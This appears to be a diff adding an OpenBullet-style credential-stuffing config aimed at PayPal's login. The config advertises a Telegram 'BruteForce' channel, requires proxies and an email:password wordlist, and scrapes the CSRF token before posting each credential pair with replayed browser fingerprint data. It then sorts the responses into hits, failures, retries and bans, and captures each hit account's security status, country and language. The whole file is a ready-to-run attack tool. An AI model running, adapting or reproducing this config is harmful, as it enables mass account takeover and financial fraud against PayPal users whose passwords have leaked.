@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "PayPal",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-10-11T19:49:44.8946381+03:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | CPM Rate: 1_10 ",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET REQUEST GET "https://www.paypal.com/signin?intent=developer&returnUri=https%3A%2F%2Fdeveloper.paypal.com%2Fdeveloper%2Fapplications" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TOK PARSE "<SOURCE>" LR "=\"token\" name=\"_csrf\" value=\"" "\">" -> VAR "TOK" 
+
+#Post REQUEST POST "https://www.paypal.com/signin?intent=developer&returnUri=https%3A%2F%2Fdeveloper.paypal.com%2Fdeveloper%2Fapplications" 
+  CONTENT "_csrf=<TOK>&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%25227e95c3f2994e4b2ba532f8e64155be36%2522%252C%2522s%2522%253A%2522UNIFIED_LOGIN_INPUT_PASSWORD%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1596309097070%252C%2522eteid%2522%253A%255B-6178208638%252C1078863538%252C4308530518%252C-3946790526%252C7964745221%252C-11762210304%252C2130054147%252C-9819527161%255D%252C%2522tts%2522%253A46440%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A1024%252C%255C%2522width%255C%2522%253A1280%252C%255C%2522availHeight%255C%2522%253A984%252C%255C%2522availWidth%255C%2522%253A1280%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520%28Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F84.0.4147.105%2520Safari%252F537.36%255C%2522%257D%2522%252C%2522d%2522%253A%257B%2522ts1%2522%253A%2522Dk000%253A44287Uk000%253A6Uh%253A1090Uh%253A1539%2522%252C%2522rDT%2522%253A%252241897%252C41098%252C41088%253A16243%252C15519%252C15477%253A41830%252C41150%252C41093%253A16227%252C15531%252C15487%253A16229%252C15530%252C15546%253A26472%252C25785%252C29344%253A31591%252C30950%252C31426%253A5832%252C5430%252C6699%253A41420%252C41273%252C41077%253A26091%252C25875%252C25727%253A15883%252C15580%252C15475%253A41529%252C41172%252C41105%253A20962%252C20495%252C20829%253A10716%252C10282%252C10354%253A51701%252C51292%252C51336%253A46578%252C46218%252C46421%253A41459%252C41096%252C41164%253A21042%252C20586%252C20621%253A46699%252C46201%252C46204%253A31352%252C30835%252C30849%253A18316%252C25%2522%257D%257D&intent=developer&ads-client-context=developer&requestUrl=%2Fsignin%3Fintent%3Ddeveloper%26returnUri%3Dhttps%253A%252F%252Fdeveloper.paypal.com%252Fdeveloper%252Fapplications&forcePhonePasswordOptIn=&returnUri=https%3A%2F%2Fdeveloper.paypal.com%2Fdeveloper%2Fapplications&phoneCode=US+%2B1&login_email=<USER>&captchaCode=&initialSplitLoginContext=inputEmail&isTpdOnboarded=&login_password=<PASS>&captcha=&splitLoginContext=inputPassword" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Some of your info isn't" 
+    KEY "Please check your entries " 
+    KEY "Sorry, we can't log you in" 
+    KEY "Something went" 
+    KEY "For security reasons, you’ll need to" 
+    KEY "Please try again." 
+  KEYCHAIN Success OR 
+    KEY "PayPal is looking" 
+    KEY "Quick security" 
+    KEY "Vérification rapide" 
+    KEY "We noticed some unusual " 
+  KEYCHAIN Retry OR 
+    KEY "Security Challenge" 
+    KEY "Security Prompt" 
+    KEY "You don't have permission to " 
+  KEYCHAIN Ban OR 
+    KEY "Access Dinied" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "is limited" 
+
+#Security PARSE "<SOURCE>" LR "\"entry\":{\"title\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Security" 
+
+#Country PARSE "<SOURCE>" LR "country: " "," CreateEmpty=FALSE -> CAP "Country" 
+
+#Local PARSE "<SOURCE>" LR "locale.x=" "\"" CreateEmpty=FALSE -> CAP "Local" 
+
+#Language PARSE "<SOURCE>" LR ", language: " "en web version" CreateEmpty=FALSE -> CAP "Language" 
+
